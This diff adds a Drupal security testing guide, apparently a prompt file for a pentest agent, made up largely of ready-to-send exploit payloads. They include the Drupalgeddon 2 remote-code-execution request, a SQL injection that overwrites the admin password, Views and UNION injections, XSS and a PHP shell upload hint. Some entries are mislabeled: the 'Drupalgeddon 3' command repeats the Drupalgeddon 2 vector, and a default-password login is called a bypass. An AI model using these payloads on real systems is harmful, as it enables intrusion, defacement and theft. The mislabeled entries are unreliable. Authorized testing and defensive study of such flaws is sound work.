@@ -1,0 +1,127 @@
+<drupal_security_guide>
+<title>DRUPAL SECURITY TESTING</title>
+
+<critical>Drupal security testing focuses on core vulnerabilities (Drupalgeddon patterns), module security, configuration exposure, and API exploitation. Testing must cover SA-CORE advisories, form bypass, Views SQL injection, and RESTful Web Services attacks.</critical>
+
+<scope>
+- Drupal version detection and Drupalgeddon vulnerabilities (SA-CORE)
+- Module enumeration and vulnerability testing
+- Configuration file exposure (settings.php)
+- User enumeration techniques
+- Form API bypass and injection
+- Views SQL injection
+- RESTful Web Services exploitation
+- Update.php access
+</scope>
+
+<methodology>
+1. Identify Drupal version and check for SA-CORE advisories.
+2. Enumerate installed modules and test for vulnerabilities.
+3. Test for Drupalgeddon patterns (RCE, SQLi).
+4. Attempt Form API bypass and injection.
+5. Test RESTful Web Services for authentication bypass.
+6. Search for settings.php and configuration exposure.
+</methodology>
+
+<version_detection>
+{% raw %}
+# Drupal version detection:
+curl -s https://example.com/CHANGELOG.txt | head -1
+curl https://example.com/core/CHANGELOG.txt
+curl -I https://example.com/misc/drupal.js
+# X-Generator: Drupal 9
+curl https://example.com/node
+# Look for "Powered by Drupal"
+
+# Drupalgeddon vulnerabilities:
+# SA-CORE-2014-005 (Drupalgeddon 1): SQL injection
+# SA-CORE-2018-002 (Drupalgeddon 2): RCE
+# SA-CORE-2018-004 (Drupalgeddon 3): RCE
+{% endraw %}
+</version_detection>
+
+<drupalgeddon_testing>
+{% raw %}
+# Drupalgeddon 2 (SA-CORE-2018-002) - RCE:
+POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
+Content-Type: application/x-www-form-urlencoded
+
+form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
+
+# Drupalgeddon 3 exploitation:
+curl -X POST https://example.com/user/register -d "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=id"
+
+# SQL injection (Drupalgeddon 1):
+POST /node?destination=node
+name[0%20;update+users+set+name%3D'admin'+,+pass+%3d+'$S$CTo9G7Lx28...'+where+uid+=+'1';--+]=test&pass=test&form_id=user_login_block
+{% endraw %}
+</drupalgeddon_testing>
+
+<module_exploitation>
+{% raw %}
+# Module enumeration:
+curl -I https://example.com/sites/all/modules/[module-name]/
+curl https://example.com/admin/modules  # Requires auth
+
+# Common vulnerable modules:
+# - Views (SQL injection)
+# - RESTful Web Services (auth bypass)
+# - Coder (RCE)
+# - Webform (various issues)
+
+# Views SQL injection:
+GET /views/ajax?view_name=test&view_display_id=page_1&view_args[0]=1' OR '1'='1
+{% endraw %}
+</module_exploitation>
+
+<restful_api_testing>
+{% raw %}
+# RESTful Web Services testing:
+GET /node/1?_format=json
+GET /user/1?_format=json
+
+# Unauthorized access:
+POST /node?_format=json
+{"type":"article","title":"Hacked","body":"Content"}
+
+# Authentication bypass:
+POST /user/login?_format=json
+{"name":"admin","pass":"password"}
+{% endraw %}
+</restful_api_testing>
+
+<common_payloads>
+{% raw %}
+# Drupalgeddon 2:
+mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=whoami
+
+# SQL injection:
+' OR '1'='1--
+' UNION SELECT password FROM users--
+
+# XSS in comments/nodes:
+<script>alert(1)</script>
+
+# File upload:
+shell.php.txt with PHP code
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate Drupal version and applicable SA-CORE CVE.
+2. Show Drupalgeddon exploitation (if vulnerable).
+3. Prove module vulnerability with working exploit.
+4. Document RESTful API unauthorized access.
+5. Show settings.php exposure with database credentials.
+</validation>
+
+<impact>
+- Remote Code Execution via Drupalgeddon
+- SQL injection in Forms or Views
+- Authentication bypass via REST API
+- Database compromise via settings.php
+- Mass defacement and data theft
+</impact>
+
+<remember>Drupal security: Check for Drupalgeddon vulnerabilities (SA-CORE-2014-005, SA-CORE-2018-002, SA-CORE-2018-004) which allow RCE and SQLi. Test RESTful Web Services for auth bypass. Enumerate modules and check for known vulnerabilities. Look for settings.php exposure containing database credentials.</remember>
+</drupal_security_guide>
